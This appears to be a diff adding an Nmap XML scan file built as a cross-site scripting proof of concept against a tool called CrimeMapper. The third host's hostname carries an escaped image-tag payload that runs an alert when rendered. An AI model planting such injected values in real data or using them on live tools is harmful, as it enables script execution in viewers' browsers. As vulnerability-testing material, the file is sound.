@@ -1,0 +1,63 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE nmaprun>
+<!--
+  CrimeMapper XSS Proof of Concept
+
+  Host 1: Clean/normal scan result
+  Host 2: Clean/normal scan result
+  Host 3: MALICIOUS - XSS payload in hostname
+-->
+<nmaprun scanner="nmap" args="nmap -sV 192.168.1.0/24" start="1737100000" version="7.94">
+
+<!-- Normal host - nothing malicious -->
+<host>
+  <status state="up"/>
+  <address addr="192.168.1.1" addrtype="ipv4"/>
+  <hostnames>
+    <hostname name="router.local" type="PTR"/>
+  </hostnames>
+  <ports>
+    <port protocol="tcp" portid="80">
+      <state state="open"/>
+      <service name="http" product="nginx"/>
+    </port>
+    <port protocol="tcp" portid="22">
+      <state state="open"/>
+      <service name="ssh" product="OpenSSH"/>
+    </port>
+  </ports>
+</host>
+
+<!-- Normal host - nothing malicious -->
+<host>
+  <status state="up"/>
+  <address addr="192.168.1.50" addrtype="ipv4"/>
+  <hostnames>
+    <hostname name="webserver" type="PTR"/>
+  </hostnames>
+  <ports>
+    <port protocol="tcp" portid="443">
+      <state state="open"/>
+      <service name="https" product="Apache"/>
+    </port>
+  </ports>
+</host>
+
+<!-- !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! -->
+<!-- MALICIOUS HOST - XSS PAYLOAD IN HOSTNAME      -->
+<!-- !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! -->
+<host>
+  <status state="up"/>
+  <address addr="192.168.1.99" addrtype="ipv4"/>
+  <hostnames>
+    <hostname name="&lt;img src=x onerror=alert('XSS!')&gt;" type="PTR"/>
+  </hostnames>
+  <ports>
+    <port protocol="tcp" portid="8080">
+      <state state="open"/>
+      <service name="http" product="Jetty"/>
+    </port>
+  </ports>
+</host>
+
+</nmaprun>
